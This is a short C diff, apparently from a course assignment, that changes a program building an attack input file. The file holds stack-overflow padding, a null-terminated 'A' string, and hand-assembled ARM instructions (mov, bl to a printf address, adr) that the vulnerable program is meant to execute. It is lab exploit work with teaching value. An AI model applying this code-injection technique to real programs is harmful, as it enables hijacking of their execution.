@@ -42,10 +42,24 @@ int main(void)
     fputc('\0', f);
 
     /* writes padding to overrun the stack */
-    for (i = 0; i < 22; i++) {
+    for (i = 0; i < 10; i++) {
         fputc('0', f);
     }
-    /* writes the instructions to the file */
+    /* writes the A char to the file to be read by printf later*/
+    fputc('A', f);
+    /* null bytes to ensure this "string" is terminated. padding
+    so that offset is a multiple of 4*/
+    for (i = 0; i < 3; i++) {
+        fputc('\0', f);
+    }
+
+    /* writes the instructions to print the 'A' char to file*/
+    movInstr = MiniAssembler_mov(0, 0x42006c);
+    fwrite(&movInstr, sizeof(unsigned int), 1, f);
+    bInstr = MiniAssembler_bl(0x400690, 0x420074);
+    fwrite(&bInstr, sizeof(unsigned int), 1, f);
+
+    /* writes the instructions to print what is in main to the file */
     movInstr = MiniAssembler_mov(0, '+');
     fwrite(&movInstr, sizeof(unsigned int), 1, f);
     adrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
